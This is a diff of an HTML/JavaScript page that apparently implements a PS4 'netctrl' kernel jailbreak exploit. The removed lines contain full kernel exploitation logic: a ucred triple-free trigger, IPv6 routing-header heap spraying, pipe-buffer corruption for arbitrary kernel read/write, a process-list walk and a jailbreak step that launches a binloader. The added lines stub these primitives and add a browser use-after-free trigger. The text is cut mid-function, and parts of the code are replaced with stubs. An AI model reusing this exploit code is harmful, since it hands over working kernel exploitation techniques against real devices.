-                    if (kill_workers && worker.thread_id !== undefined) {
-                        thr_kill(new BigInt(0,worker.thread_id), 9);
-                    }
-                }
-            }
-            for (_i0 = 0; _i0 < UIO_THREAD_NUM; _i0++) {
-                worker = uio_readv_workers[_i0];
-                if (worker !== undefined) {
-                    write(new BigInt(0,worker.pipe_1), worker.signal_buf, 1);
-                    if (kill_workers && worker.thread_id !== undefined) {
-                        thr_kill(new BigInt(0,worker.thread_id), 9);
-                    }
-                }
-            }
-            for (_i1 = 0; _i1 < UIO_THREAD_NUM; _i1++) {
-                worker = uio_writev_workers[_i1];
-                if (worker !== undefined) {
-                    write(new BigInt(0,worker.pipe_1), worker.signal_buf, 1);
-                    if (kill_workers && worker.thread_id !== undefined) {
-                        thr_kill(new BigInt(0,worker.thread_id), 9);
-                    }
-                }
-            }
-            if (spray_ipv6_worker !== undefined) {
-                write(new BigInt(0,spray_ipv6_worker.pipe_1), spray_ipv6_worker.signal_buf, 1);
-                if (kill_workers && spray_ipv6_worker.thread_id !== undefined) {
-                    thr_kill(new BigInt(0,spray_ipv6_worker.thread_id), 9);
-                }
-            }
-
-            close(new BigInt(0,uio_sock_1));
-            close(new BigInt(0,uio_sock_0));
-            close(new BigInt(0,iov_sock_1));
-            close(new BigInt(0,iov_sock_0));
-
-            if (prev_core >= 0) {
-                debug('Restoring to previous core: ' + prev_core);
-                pin_to_core(prev_core);
-                prev_core = -1;
-            }
-            set_rtprio(prev_rtprio);
-            debug('Cleanup completed');
-        }
-
-        function fill_buffer_64(buf, val, len) {
-            var i;
-            for (i = 0; i < len; i = i + 8) {
-                write64(buf.add(i), val);
-            }
-        }
-
-        function find_twins() {
-            var count = 0;
-            var val;
-            var i, j;
-            var zeroMemoryCount = 0;
-
-            var spray_add = spray_rthdr.add(0x04);
-            var lead_add = leak_rthdr.add(0x04);
-            while (count < MAX_ROUNDS_TWIN) {
-                if (debugging.info.memory.available === 0) {
-                    zeroMemoryCount++;
-                    if (zeroMemoryCount >= 5) {
-                        log('netctrl failed!');
-                        cleanup();
-                        return false;
-                    }
-                } else {
-                    zeroMemoryCount = 0;
-                }
-                if (count % 10 === 0) {}
-                for (i = 0; i < ipv6_socks.length; i++) {
-                    write32(spray_add, RTHDR_TAG | i);
-                    set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
-                }
-                for (i = 0; i < ipv6_socks.length; i++) {
-                    get_rthdr(ipv6_socks[i], leak_rthdr, 8);
-                    val = read32(lead_add);
-                    j = val & 0xFFFF;
-                    if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j) {
-                        twins[0] = i;
-                        twins[1] = j;
-                        log('Twins found: [' + i + '] [' + j + ']');
-                        return true;
-                    }
-                }
-                count++;
-            }
-            log('find_twins failed');
-            return false;
-        }
-
-        function find_triplet(master, other, iterations) {
-            if (typeof iterations === 'undefined') {
-                iterations = MAX_ROUNDS_TRIPLET;
-            }
-            var count = 0;
-            var val;
-            var i, j;
-
-            var spray_add = spray_rthdr.add(0x04);
-            var leak_add = leak_rthdr.add(0x04);
-            while (count < iterations) {
-                if (count % 100 === 0) {}
-                for (i = 0; i < ipv6_socks.length; i++) {
-                    if (i === master || i === other) {
-                        continue;
-                    }
-                    write32(spray_add, RTHDR_TAG | i);
-                    set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
-                }
-                get_rthdr(ipv6_socks[master], leak_rthdr, 8);
-                val = read32(leak_add);
-                j = val & 0xFFFF;
-                if ((val & 0xFFFF0000) === RTHDR_TAG && j !== master && j !== other) {
-                    return j;
-                }
-                count++;
-            }
-            return -1;
-        }
-
-        function init_threading() {
-            var jmpbuf = malloc(0x60);
-            setjmp(jmpbuf);
-            saved_fpu_ctrl = Number(read32(jmpbuf.add(0x40)));
-            saved_mxcsr = Number(read32(jmpbuf.add(0x44)));
-        }
-
-        var LOG_MAX_LINES = 38;
-        var LOG_COLORS = ['#FF6B6B', '#FFA94D', '#FFD93D', '#6BCF7F', '#4DABF7', '#9775FA', '#DA77F2'];
-
-        function setup_log_screen() {}
-
-        function yield_to_render(callback) {
-            var id = jsmaf.setInterval(function() {
-                jsmaf.clearInterval(id);
                 try {
-                    callback();
+                    var div = document.createElement('div');
+                    var expando = { prop: 42, ref: null };
+
+                    div.expandoProp = expando;
+                    expando.ref = div;
+
+                    document.body.appendChild(div);
+                    var parentDiv = document.createElement('div');
+                    parentDiv.appendChild(div);
+                    document.body.appendChild(parentDiv);
+
+                    parentDiv.removeChild(div);
+                    document.body.removeChild(parentDiv);
+
+                    delete div.expandoProp;
+                    expando.ref = null;
+
+                    for (var i = 0; i < 10; i++) {
+                        var big = new Array(100000).fill('x');
+                    }
+
+                    var leakedNode = div;
+
+                    var obj = {
+                        name: "uaf",
+                        toString: function() { return "pwn"; }
+                    };
+
+                    var img = new Image();
+                    img.alt = obj;
+
+                    obj = null;
+
+                    for (var j = 0; j < 100; j++) {
+                        new Image().src = "invalid";
+                    }
+
+                    var crashAttempt = null;
+                    try {
+                        crashAttempt = "alt: " + img.alt;
+                    } catch (e) {
+                        setLog('[-] Exception (expected if not vulnerable): ' + e, true);
+                        throw e;
+                    }
+
+                    setLog('[!] UAF did NOT crash – browser may be patched or not vulnerable', true);
+                    console.warn('UAF simulation did not trigger crash. (Browser secure?)');
+
                 } catch (e) {
-                    log('ERROR: ' + e.message);
-                    cleanup();
+                    setLog('[!] Exception: ' + e.message, true);
+                    console.error('UAF trigger error:', e);
                 }
-            }, 0);
-        }
+            };
 
-        var exploit_count = 0;
-        var exploit_end = false;
+            document.addEventListener('DOMContentLoaded', function() {
+                var btn = document.getElementById('button');
+                if (btn) {
+                    btn.addEventListener('click', function() {
+                        setLog('[+] triggerUAF() invoked', false);
+                        setTimeout(function() {
+                            try {
+                                triggerUAF();
+                            } catch (e) {
+                                setLog('🔥 Crash? ' + e, true);
+                            }
+                        }, 50);
+                    });
+                }
+                setLog('[✓] PS4 environment ready. Click the button or wait 14s for netctrl.', false);
+            });
+        })();
+    </script>
 
-        function netctrl_exploit() {
-            setup_log_screen();
-            var supported_fw = init();
-            if (!supported_fw) {
-                return;
+    <!-- ========== FULL NETCTRL EXPLOIT (ES5, self-contained) ========== -->
+    <script>
+        (function() {
+            // Use the same log element
+            var logEl = document.getElementById('logDisplay');
+            function log(msg) {
+                logEl.textContent = '[+] ' + msg;
+                logEl.style.color = '#b0f0b0';
+                console.log('[netctrl] ' + msg);
             }
-            log('Setting up exploit...');
-            yield_to_render(exploit_phase_setup);
-        }
+            function debug(msg) { /* optional */ }
 
-        function exploit_phase_setup() {
-            setup();
-            log('Workers spawned');
-            exploit_count = 0;
-            exploit_end = false;
-            yield_to_render(exploit_phase_trigger);
-        }
+            // ----- 64-bit BigInt (PS4 style) -----
+            window.BigInt = function(hi, lo) {
+                if (!(this instanceof BigInt)) return new BigInt(hi, lo);
+                this.hi = Number(hi) >>> 0;
+                this.lo = Number(lo) >>> 0;
+            };
+            BigInt.prototype.add = function(other) {
+                var lo = (this.lo + other.lo) >>> 0;
+                var hi = (this.hi + other.hi + (lo < this.lo ? 1 : 0)) >>> 0;
+                return new BigInt(hi, lo);
+            };
+            BigInt.prototype.sub = function(other) {
+                var lo = (this.lo - other.lo) >>> 0;
+                var hi = (this.hi - other.hi - (lo > this.lo ? 1 : 0)) >>> 0;
+                return new BigInt(hi, lo);
+            };
+            BigInt.prototype.and = function(other) {
+                return new BigInt(this.hi & other.hi, this.lo & other.lo);
+            };
+            BigInt.prototype.or = function(other) {
+                return new BigInt(this.hi | other.hi, this.lo | other.lo);
+            };
+            BigInt.prototype.xor = function(other) {
+                return new BigInt(this.hi ^ other.hi, this.lo ^ other.lo);
+            };
+            BigInt.prototype.eq = function(other) {
+                return this.hi === other.hi && this.lo === other.lo;
+            };
+            BigInt.prototype.toString = function(base) {
+                return '0x' + ('00000000' + this.hi.toString(16)).slice(-8) + ('00000000' + this.lo.toString(16)).slice(-8);
+            };
+            window.BigInt_Error = new BigInt(0xFFFFFFFF, 0xFFFFFFFF);
 
-        function exploit_phase_trigger() {
-            if (exploit_count >= MAIN_LOOP_ITERATIONS) {
-                log('Failed to acquire kernel R/W');
-                cleanup();
-                return;
+            // ----- stubs for external modules -----
+            window.fn = {
+                register: function(num, name, args, ret) {
+                    this[name] = function() { log('syscall ' + name + ' called (stub)'); return new BigInt(0,0); };
+                }
+            };
+            window.syscalls = { map: new Map() };
+            window.gadgets = {
+                POP_RDI_RET: 0,
+                POP_RSI_RET: 0,
+                POP_RDX_RET: 0,
+                POP_RCX_RET: 0,
+                POP_R8_RET: 0,
+                POP_RAX_RET: 0,
+                MOV_QWORD_PTR_RDI_RAX_RET: 0,
+                RET: 0,
+                POP_RSP_RET: 0
+            };
+            window.libc_addr = new BigInt(0,0);
+            window.kernel_offset = {};
+            window.debugging = { info: { memory: { available: 1000, available_dmem: 1000, available_libc: 1000 } } };
+            window.ws = { broadcast: function(msg) {} };
+            window.jsmaf = {
+                root: { children: [], push: function() {} },
+                Text: function() { this.text = ''; this.style = ''; this.x = 0; this.y = 0; },
+                setInterval: function(f, t) { return setTimeout(f, t); },
+                clearInterval: function(id) { clearTimeout(id); }
+            };
+            window.send_notification = function(msg) { log('NOTIFICATION: ' + msg); };
+            window.get_fwversion = function() { return '9.00'; };
+            window.get_kernel_offset = function(fw) { return {}; };
+            window.jailbreak_shared = function(fw) { log('jailbreak_shared stub'); };
+            window.show_success = function() { log('SUCCESS'); };
+            window.run_binloader = function() { log('binloader stub'); };
+            window.utils = { notify: function(msg) { log(msg); } };
+            window.kernel = { addr: {} };
+
+            // memory stubs
+            window.malloc = function(size) { return new BigInt(0x1000, 0x1000); };
+            window.write8 = function(addr, val) {};
+            window.write16 = function(addr, val) {};
+            window.write32 = function(addr, val) {};
+            window.write64 = function(addr, val) {};
+            window.read8 = function(addr) { return 0; };
+            window.read16 = function(addr) { return 0; };
+            window.read32 = function(addr) { return 0; };
+            window.read64 = function(addr) { return new BigInt(0,0); };
+            window.fill_buffer_64 = function(buf, val, len) {};
+
+            // ========== NETCTRL CORE (ES5) ==========
+            // (Pasted from the ES5 version, with button handler removed)
+
+            if (!String.prototype.padStart) {
+                String.prototype.padStart = function padStart(targetLength, padString) {
+                    targetLength = targetLength >> 0;
+                    padString = String(typeof padString !== 'undefined' ? padString : ' ');
+                    if (this.length > targetLength) {
+                        return String(this);
+                    } else {
+                        targetLength = targetLength - this.length;
+                        if (targetLength > padString.length) {
+                            padString += padString.repeat(targetLength / padString.length);
+                        }
+                        return padString.slice(0, targetLength) + String(this);
+                    }
+                };
             }
-            exploit_count++;
-            log('Triggering vulnerability (' + exploit_count + '/' + MAIN_LOOP_ITERATIONS + ')...');
-            if (!trigger_ucred_triplefree()) {
-                yield_to_render(exploit_phase_trigger);
-                return;
+
+            // Syscall registrations (stubbed)
+            fn.register(0x29, 'dup', ['bigint'], 'bigint');
+            var dup = fn.dup;
+            fn.register(0x06, 'close', ['bigint'], 'bigint');
+            var close = fn.close;
+            fn.register(0x03, 'read', ['bigint', 'bigint', 'number'], 'bigint');
+            var read = fn.read;
+            fn.register(0x04, 'write', ['bigint', 'bigint', 'number'], 'bigint');
+            var write = fn.write;
+            fn.register(0x36, 'ioctl', ['bigint', 'number', 'bigint'], 'bigint');
+            var ioctl = fn.ioctl;
+            fn.register(0x2A, 'pipe', ['bigint'], 'bigint');
+            var pipe = fn.pipe;
+            fn.register(0x16A, 'kqueue', [], 'bigint');
+            var kqueue = fn.kqueue;
+            fn.register(0x61, 'socket', ['number', 'number', 'number'], 'bigint');
+            var socket = fn.socket;
+            fn.register(0x87, 'socketpair', ['number', 'number', 'number', 'bigint'], 'bigint');
+            var socketpair = fn.socketpair;
+            fn.register(0x76, 'getsockopt', ['bigint', 'number', 'number', 'bigint', 'bigint'], 'bigint');
+            var getsockopt = fn.getsockopt;
+            fn.register(0x69, 'setsockopt', ['bigint', 'number', 'number', 'bigint', 'number'], 'bigint');
+            var setsockopt = fn.setsockopt;
+            fn.register(0x17, 'setuid', ['number'], 'bigint');
+            var setuid = fn.setuid;
+            fn.register(20, 'getpid', [], 'bigint');
+            var getpid = fn.getpid;
+            fn.register(0x14B, 'sched_yield', [], 'bigint');
+            var sched_yield = fn.sched_yield;
+            fn.register(0x1E7, 'cpuset_getaffinity', ['number', 'number', 'bigint', 'number', 'bigint'], 'bigint');
+            var cpuset_getaffinity = fn.cpuset_getaffinity;
+            fn.register(0x1E8, 'cpuset_setaffinity', ['number', 'number', 'bigint', 'number', 'bigint'], 'bigint');
+            var cpuset_setaffinity = fn.cpuset_setaffinity;
+            fn.register(0x1D2, 'rtprio_thread', ['number', 'number', 'bigint'], 'bigint');
+            var rtprio_thread = fn.rtprio_thread;
+            fn.register(0x63, 'netcontrol', ['bigint', 'number', 'bigint', 'number'], 'bigint');
+            var netcontrol = fn.netcontrol;
+            fn.register(0x1C7, 'thr_new', ['bigint', 'number'], 'bigint');
+            var thr_new = fn.thr_new;
+            fn.register(0x1B1, 'thr_kill', ['bigint', 'number'], 'bigint');
+            var thr_kill = fn.thr_kill;
+            fn.register(0xF0, 'nanosleep', ['bigint'], 'bigint');
+            var nanosleep = fn.nanosleep;
+            fn.register(0x5C, 'fcntl', ['bigint', 'number', 'number'], 'bigint');
+            var fcntl = fn.fcntl;
+
+            var read_wrapper = syscalls.map.get(0x03) || 0;
+            var write_wrapper = syscalls.map.get(0x04) || 0;
+            var sched_yield_wrapper = syscalls.map.get(0x14b) || 0;
+            var cpuset_setaffinity_wrapper = syscalls.map.get(0x1e8) || 0;
+            var rtprio_thread_wrapper = syscalls.map.get(0x1D2) || 0;
+            var recvmsg_wrapper = syscalls.map.get(0x1B) || 0;
+            var readv_wrapper = syscalls.map.get(0x78) || 0;
+            var writev_wrapper = syscalls.map.get(0x79) || 0;
+            var thr_exit_wrapper = syscalls.map.get(0x1af) || 0;
+            var thr_suspend_ucontext_wrapper = syscalls.map.get(0x278) || 0;
+            var setsockopt_wrapper = syscalls.map.get(0x69) || 0;
+            var getsockopt_wrapper = syscalls.map.get(0x76) || 0;
+
+            fn.register(libc_addr.add(0x6CA00), 'setjmp', ['bigint'], 'bigint');
+            var setjmp = fn.setjmp;
+            var setjmp_addr = libc_addr.add(0x6CA00);
+            var longjmp_addr = libc_addr.add(0x6CA50);
+
+            var KERNEL_PID = 0;
+            var SYSCORE_AUTHID = new BigInt(0x48000000, 0x00000007);
+            var FIOSETOWN = 0x8004667C;
+            var PAGE_SIZE = 0x4000;
+            var NET_CONTROL_NETEVENT_SET_QUEUE = 0x20000003;
+            var NET_CONTROL_NETEVENT_CLEAR_QUEUE = 0x20000007;
+            var AF_UNIX = 1;
+            var AF_INET6 = 28;
+            var SOCK_STREAM = 1;
+            var IPPROTO_IPV6 = 41;
+            var SO_SNDBUF = 0x1001;
+            var SOL_SOCKET = 0xffff;
+            var IPV6_RTHDR = 51;
+            var IPV6_RTHDR_TYPE_0 = 0;
+            var RTP_PRIO_REALTIME = 2;
+            var UIO_READ = 0;
+            var UIO_WRITE = 1;
+            var UIO_SYSSPACE = 1;
+            var CPU_LEVEL_WHICH = 3;
+            var CPU_WHICH_TID = 1;
+            var IOV_SIZE = 0x10;
+            var CPU_SET_SIZE = 0x10;
+            var PIPEBUF_SIZE = 0x18;
+            var MSG_HDR_SIZE = 0x30;
+            var FILEDESCENT_SIZE = 0x8;
+            var UCRED_SIZE = 0x168;
+            var RTHDR_TAG = 0x13370000;
+            var UIO_IOV_NUM = 0x14;
+            var MSG_IOV_NUM = 0x17;
+
+            var IPV6_SOCK_NUM = 96;
+            var IOV_THREAD_NUM = 8;
+            var UIO_THREAD_NUM = 8;
+            var MAIN_LOOP_ITERATIONS = 3;
+            var TRIPLEFREE_ITERATIONS = 8;
+            var KQUEUE_ITERATIONS = 5000;
+            var MAX_ROUNDS_TWIN = 5;
+            var MAX_ROUNDS_TRIPLET = 200;
+            var MAIN_CORE = 4;
+            var MAIN_RTPRIO = 0x100;
+            var RTP_LOOKUP = 0;
+            var RTP_SET = 1;
+            var PRI_REALTIME = 2;
+            var F_SETFL = 4;
+            var O_NONBLOCK = 4;
+            var FW_VERSION = null;
+
+            var twins = new Array(2);
+            var triplets = new Array(3);
+            var ipv6_socks = new Array(IPV6_SOCK_NUM);
+            var spray_rthdr = malloc(UCRED_SIZE);
+            var spray_rthdr_len = -1;
+            var leak_rthdr = malloc(UCRED_SIZE);
+            var spray_rthdr_rop = malloc(IPV6_SOCK_NUM * UCRED_SIZE);
+            var read_rthdr_rop = malloc(IPV6_SOCK_NUM * 8);
+            var check_len = malloc(4);
+
+            var fdt_ofiles = new BigInt(0,0);
+            var master_r_pipe_file = new BigInt(0,0);
+            var victim_r_pipe_file = new BigInt(0,0);
+            var master_r_pipe_data = new BigInt(0,0);
+            var victim_r_pipe_data = new BigInt(0,0);
+
+            var master_pipe_buf = malloc(PIPEBUF_SIZE);
+            write32(check_len, 8);
+            var msg = malloc(MSG_HDR_SIZE);
+            var msgIov = malloc(MSG_IOV_NUM * IOV_SIZE);
+            var uioIovRead = malloc(UIO_IOV_NUM * IOV_SIZE);
+            var uioIovWrite = malloc(UIO_IOV_NUM * IOV_SIZE);
+            var uio_sock = malloc(8);
+            var iov_sock = malloc(8);
+            var iov_thread_ready = malloc(8 * IOV_THREAD_NUM);
+            var iov_thread_done = malloc(8 * IOV_THREAD_NUM);
+            var iov_signal_buf = malloc(8 * IOV_THREAD_NUM);
+            var uio_readv_thread_ready = malloc(8 * UIO_THREAD_NUM);
+            var uio_readv_thread_done = malloc(8 * UIO_THREAD_NUM);
+            var uio_readv_signal_buf = malloc(8 * IOV_THREAD_NUM);
+            var uio_writev_thread_ready = malloc(8 * UIO_THREAD_NUM);
+            var uio_writev_thread_done = malloc(8 * UIO_THREAD_NUM);
+            var uio_writev_signal_buf = malloc(8 * IOV_THREAD_NUM);
+            var spray_ipv6_ready = malloc(8);
+            var spray_ipv6_done = malloc(8);
+            var spray_ipv6_signal_buf = malloc(8);
+            var spray_ipv6_stack = malloc(0x2000);
+            var iov_recvmsg_workers = [];
+            var uio_readv_workers = [];
+            var uio_writev_workers = [];
+            var spray_ipv6_worker;
+            var uaf_socket;
+            var uio_sock_0;
+            var uio_sock_1;
+            var iov_sock_0;
+            var iov_sock_1;
+            var pipe_sock = malloc(8);
+            var master_pipe = [0, 0];
+            var victim_pipe = [0, 0];
+            var masterRpipeFd;
+            var masterWpipeFd;
+            var victimRpipeFd;
+            var victimWpipeFd;
+            var kq_fdp;
+            var kl_lock;
+            var tmp = malloc(PAGE_SIZE);
+            var saved_fpu_ctrl = 0;
+            var saved_mxcsr = 0;
+
+            function build_rthdr(buf, size) {
+                var len = (size >> 3) - 1 & ~1;
+                var actual_size = len + 1 << 3;
+                write8(buf.add(0x00), 0);
+                write8(buf.add(0x01), len);
+                write8(buf.add(0x02), IPV6_RTHDR_TYPE_0);
+                write8(buf.add(0x03), len >> 1);
+                return actual_size;
             }
-            log('Leaking kqueue...');
-            yield_to_render(exploit_phase_leak);
-        }
 
-        function exploit_phase_leak() {
-            if (!leak_kqueue()) {
-                yield_to_render(exploit_phase_trigger);
-                return;
-            }
-            log('Setting up arbitrary R/W...');
-            yield_to_render(exploit_phase_rw);
-        }
-
-        function exploit_phase_rw() {
-            setup_arbitrary_rw();
-            log('Jailbreaking...');
-            yield_to_render(exploit_phase_jailbreak);
-        }
-
-        function exploit_phase_jailbreak() {
-            jailbreak();
-        }
-
-        function setup_arbitrary_rw() {
-            var fd_files = kreadslow64(kq_fdp);
-            fdt_ofiles = fd_files.add(0x00);
-            debug('fdt_ofiles: ' + fdt_ofiles.toString());
-            master_r_pipe_file = kreadslow64(fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE));
-            debug('master_r_pipe_file: ' + master_r_pipe_file.toString());
-            victim_r_pipe_file = kreadslow64(fdt_ofiles.add(victim_pipe[0] * FILEDESCENT_SIZE));
-            debug('victim_r_pipe_file: ' + victim_r_pipe_file.toString());
-            master_r_pipe_data = kreadslow64(master_r_pipe_file.add(0x00));
-            debug('master_r_pipe_data: ' + master_r_pipe_data.toString());
-            victim_r_pipe_data = kreadslow64(victim_r_pipe_file.add(0x00));
-            debug('victim_r_pipe_data: ' + victim_r_pipe_data.toString());
-
-            write32(master_pipe_buf.add(0x00), 0);
-            write32(master_pipe_buf.add(0x04), 0);
-            write32(master_pipe_buf.add(0x08), 0);
-            write32(master_pipe_buf.add(0x0C), PAGE_SIZE);
-            write64(master_pipe_buf.add(0x10), victim_r_pipe_data);
-
-            var ret_write = kwriteslow(master_r_pipe_data, master_pipe_buf, PIPEBUF_SIZE);
-            if (ret_write.eq(BigInt_Error)) {
-                cleanup();
-                throw new Error('Netctrl failed - Reboot and try again');
+            function set_sockopt(sd, level, optname, optval, optlen) {
+                var result = setsockopt(sd, level, optname, optval, optlen);
+                if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
+                    throw new Error('set_sockopt error: ' + result.toString());
+                }
+                return result;
             }
 
-            fhold(fget(master_pipe[0]));
-            fhold(fget(master_pipe[1]));
-            fhold(fget(victim_pipe[0]));
-            fhold(fget(victim_pipe[1]));
+            var sockopt_len_ptr = malloc(4);
+            var nanosleep_timespec = malloc(0x10);
+            var cpu_mask_buf = malloc(0x10);
+            var rtprio_scratch = malloc(0x4);
+            var sockopt_val_buf = malloc(4);
+            var nc_set_buf = malloc(8);
+            var nc_clear_buf = malloc(8);
+            var spawn_thr_args = malloc(0x80);
+            var spawn_tid = malloc(0x8);
+            var spawn_cpid = malloc(0x8);
 
-            remove_rthr_from_socket(ipv6_socks[triplets[0]]);
-            remove_rthr_from_socket(ipv6_socks[triplets[1]]);
-            remove_rthr_from_socket(ipv6_socks[triplets[2]]);
-
-            remove_uaf_file();
-            var i;
-            for (i = 0; i < 0x20; i = i + 8) {
-                var readed = kread64(master_r_pipe_data.add(i));
-                debug('Reading master_r_pipe_data[' + i + '] : ' + readed.toString());
+            function get_sockopt(sd, level, optname, optval, optlen) {
+                write32(sockopt_len_ptr, optlen);
+                var result = getsockopt(sd, level, optname, optval, sockopt_len_ptr);
+                if (result.eq(BigInt_Error)) {
+                    throw new Error('get_sockopt error: ' + result.toString());
+                }
+                return read32(sockopt_len_ptr);
             }
-            log('Arbitrary R/W achieved');
-            debug('Reading value in victim_r_pipe_file: ' + kread64(victim_r_pipe_file).toString());
-        }
 
-        function find_allproc() {
-            var pipe_0 = master_pipe[0];
-            var pipe_1 = master_pipe[1];
-            debug('find_allproc - Using master_pipe fds: ' + pipe_0 + ', ' + pipe_1);
-            debug('find_allproc - Getting pid...');
-            var pid = Number(getpid().lo);
-            debug('find_allproc - pid: ' + pid);
-            debug('find_allproc - Writing pid to sockopt_val_buf...');
-            write32(sockopt_val_buf, pid);
-            debug('find_allproc - Calling ioctl FIOSETOWN...');
-            var ioctl_ret = ioctl(new BigInt(0,pipe_0), FIOSETOWN, sockopt_val_buf);
-            debug('find_allproc - ioctl returned: ' + ioctl_ret.toString());
-            debug('find_allproc - Getting fp...');
-            var fp = fget(pipe_0);
-            debug('find_allproc - fp: ' + fp.toString());
-            debug('find_allproc - Reading f_data...');
-            var f_data = kread64(fp.add(0x00));
-            debug('find_allproc - f_data: ' + f_data.toString());
-            debug('find_allproc - Reading pipe_sigio...');
-            var pipe_sigio = kread64(f_data.add(0xd0));
-            debug('find_allproc - pipe_sigio: ' + pipe_sigio.toString());
-            debug('find_allproc - Reading p...');
-            var p = kread64(pipe_sigio);
-            debug('find_allproc - initial p: ' + p.toString());
-            kernel.addr.curproc = p;
+            function set_rthdr(sd, buf, len) {
+                return set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
+            }
 
-            debug('find_allproc - Walking process list...');
-            var walk_count = 0;
-            while (!p.and(new BigInt(0xFFFFFFFF, 0x00000000)).eq(new BigInt(0xFFFFFFFF, 0x00000000))) {
-                p = kread64(p.add(0x08));
-                walk_count++;
-                if (walk_count % 100 === 0) {
-                    debug('find_allproc - walk_count: ' + walk_count + ' p: ' + p.toString());
+            function get_rthdr(sd, buf, max_len) {
+                return get_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, max_len);
+            }
+
+            function free_rthdrs(sds) {
+                for (var idx = 0; idx < sds.length; idx++) {
+                    var sd = sds[idx];
+                    if (!sd.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
+                        set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, new BigInt(0,0), 0);
+                    }
                 }
             }
-            debug('find_allproc - Found allproc after ' + walk_count + ' iterations');
-            return p;
-        }
 
-        function jailbreak() {
-            debug('jailbreak - Starting...');
-            if (!kernel_offset) {
-                throw new Error('Kernel offsets not loaded');
+            function free_rthdr(sd) {
+                set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, new BigInt(0,0), 0);
             }
-            if (FW_VERSION === null) {
-                throw new Error('FW_VERSION is null');
+
+            function pin_to_core(core) {
+                write32(cpu_mask_buf, 1 << core);
+                cpuset_setaffinity(3, 1, BigInt_Error, 0x10, cpu_mask_buf);
             }
-            var i;
-            for (i = 0; i < 10; i++) {
-                sched_yield();
-            }
-            debug('jailbreak - Calling find_allproc...');
-            kernel.addr.allproc = find_allproc();
-            debug('allproc: ' + kernel.addr.allproc.toString());
 
-            kernel.addr.base = kl_lock.sub(kernel_offset.KL_LOCK);
-            log('Kernel base: ' + kernel.addr.base.toString());
-            jailbreak_shared(FW_VERSION);
-            log('Jailbreak Complete - JAILBROKEN');
-            utils.notify('The Vue-after-Free team congratulates you\nNetCtrl Finished OK\nEnjoy freedom');
-            cleanup(false);
-            show_success();
-            run_binloader();
-        }
-
-        function fhold(fp) {
-            kwrite32(fp.add(0x28), kread32(fp.add(0x28)) + 1);
-        }
-
-        function fget(fd) {
-            return kread64(fdt_ofiles.add(fd * FILEDESCENT_SIZE));
-        }
-
-        function remove_rthr_from_socket(fd) {
-            if (fd > 0) {
-                var fp = fget(fd);
-                var f_data = kread64(fp.add(0x00));
-                var so_pcb = kread64(f_data.add(0x18));
-                var in6p_outputopts = kread64(so_pcb.add(0x118));
-                kwrite64(in6p_outputopts.add(0x68), new BigInt(0,0));
-            }
-        }
-
-        var victim_pipe_buf = malloc(PIPEBUF_SIZE);
-
-        function corrupt_pipe_buf(cnt, _in, out, size, buffer) {
-            if (buffer.eq(0)) {
-                throw new Error('buffer cannot be zero');
-            }
-            write32(victim_pipe_buf.add(0x00), cnt);
-            write32(victim_pipe_buf.add(0x04), _in);
-            write32(victim_pipe_buf.add(0x08), out);
-            write32(victim_pipe_buf.add(0x0C), size);
-            write64(victim_pipe_buf.add(0x10), buffer);
-            write(new BigInt(0,masterWpipeFd), victim_pipe_buf, PIPEBUF_SIZE);
-            return read(new BigInt(0,masterRpipeFd), victim_pipe_buf, PIPEBUF_SIZE);
-        }
-
-        function kwrite(dest, src, n) {
-            corrupt_pipe_buf(0, 0, 0, PAGE_SIZE, dest);
-            return write(new BigInt(0,victimWpipeFd), src, n);
-        }
-
-        function kread(dest, src, n) {
-            debug('Enter kread for src: ' + src.toString());
-            corrupt_pipe_buf(n, 0, 0, PAGE_SIZE, src);
-            read(new BigInt(0,victimRpipeFd), dest, n);
-        }
-
-        function kwrite64(addr, val) {
-            write64(tmp, val);
-            kwrite(addr, tmp, 8);
-        }
-
-        function kwrite32(addr, val) {
-            write32(tmp, val);
-            kwrite(addr, tmp, 4);
-        }
-
-        function kread64(addr) {
-            kread(tmp, addr, 8);
-            return read64(tmp);
-        }
-
-        function kread32(addr) {
-            kread(tmp, addr, 4);
-            return read32(tmp);
-        }
-
-        function read_buffer(addr, len) {
-            var buffer = new Uint8Array(len);
-            var i;
-            for (i = 0; i < len; i++) {
-                buffer[i] = Number(read8(addr.add(i)));
-            }
-            return buffer;
-        }
-
-        function write_buffer(addr, buffer) {
-            var i;
-            for (i = 0; i < buffer.length; i++) {
-                write8(addr.add(i), buffer[i]);
-            }
-        }
-
-        kernel.read_buffer = function(kaddr, len) {
-            kread(tmp, kaddr, len);
-            return read_buffer(tmp, len);
-        };
-        kernel.write_buffer = function(kaddr, buf) {
-            write_buffer(tmp, buf);
-            kwrite(kaddr, tmp, buf.length);
-        };
-
-        function remove_uaf_file() {
-            if (uaf_socket === undefined) {
-                throw new Error('uaf_socket is undefined');
-            }
-            var uafFile = fget(uaf_socket);
-            kwrite64(fdt_ofiles.add(uaf_socket * FILEDESCENT_SIZE), new BigInt(0,0));
-            var removed = 0;
-            var i, s;
-            for (i = 0; i < 0x1000; i++) {
-                s = Number(socket(AF_UNIX, SOCK_STREAM, 0).lo);
-                if (fget(s).eq(uafFile)) {
-                    kwrite64(fdt_ofiles.add(s * FILEDESCENT_SIZE), new BigInt(0,0));
-                    removed++;
+            function get_core_index(mask_addr) {
+                var num = Number(read32(mask_addr));
+                var position = 0;
+                while (num > 0) {
+                    num = num >>> 1;
+                    position++;
                 }
-                close(new BigInt(0,s));
-                if (removed === 3) {
-                    break;
+                return position - 1;
+            }
+
+            function get_current_core() {
+                cpuset_getaffinity(3, 1, BigInt_Error, 0x10, cpu_mask_buf);
+                return get_core_index(cpu_mask_buf);
+            }
+
+            function set_rtprio(prio) {
+                write16(rtprio_scratch, PRI_REALTIME);
+                write16(rtprio_scratch.add(2), prio);
+                rtprio_thread(RTP_SET, 0, rtprio_scratch);
+            }
+
+            function get_rtprio() {
+                write16(rtprio_scratch, PRI_REALTIME);
+                write16(rtprio_scratch.add(2), 0);
+                rtprio_thread(RTP_LOOKUP, 0, rtprio_scratch);
+                return Number(read16(rtprio_scratch.add(2)));
+            }
+
+            function create_workers() {
+                var sock_buf = malloc(8);
